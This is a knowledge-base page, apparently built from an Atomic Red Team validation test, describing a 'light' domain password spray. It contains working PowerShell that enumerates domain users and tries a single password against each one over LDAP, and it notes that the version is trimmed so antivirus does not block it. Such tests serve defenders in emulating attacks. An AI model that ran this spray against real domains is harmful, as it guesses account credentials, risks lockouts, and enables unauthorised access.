---
atomic_guid: "b15bc9a5-a4f3-4879-9304-ea0011ace63a"
title: "Password Spray Invoke-DomainPasswordSpray Light"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "b15bc9a5-a4f3-4879-9304-ea0011ace63a"
  - "Password Spray Invoke-DomainPasswordSpray Light"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Password Spray Invoke-DomainPasswordSpray Light

Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) 
but without all the extra code that makes the script get blocked by many AVs. 
This atomic test will attempt a single password against all users in a password list at $env:Temp\usersdpsLight.txt. You can create this file manually
or with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.

## Metadata

- Atomic GUID: b15bc9a5-a4f3-4879-9304-ea0011ace63a
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### password

- description: The password to try for each user in users.txt
- type: string
- default: Spring2020

### user_limit

- description: The max number of users to put in the list when running the prereq_command
- type: integer
- default: 200

## Dependencies

Username file must exist at $env:Temp\usersdpsLight.txt

### Prerequisite Check

```untitled
if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else {exit 1}
```

### Get Prerequisite

```untitled
Write-Host -NoNewLine "Reading Users." # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration
$netOutput = net users /domain
$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])
$userLimit = #{user_limit}; $usercount = 0
foreach ($line in $netOutput) {
  if($usercount -ge $userLimit){break}
  $line = $line.trim()
  $line = $line -split '\s\s+'
  foreach ($user in $line){
    if($usercount -ge $userLimit){break}
    Add-Content $env:Temp\usersdpsLight.txt $user
    $usercount = $usercount + 1
    }  
}
Write-Host "Usernames saved to $env:Temp\usersdpsLight.txt"
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = "LDAP://" + ([ADSI]"").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
  }
  else { Write-Host ". " -NoNewline}
}
Write-Host -ForegroundColor green "Finished"
}
Invoke-dpsLight "#{password}" $env:Temp\usersdpsLight.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
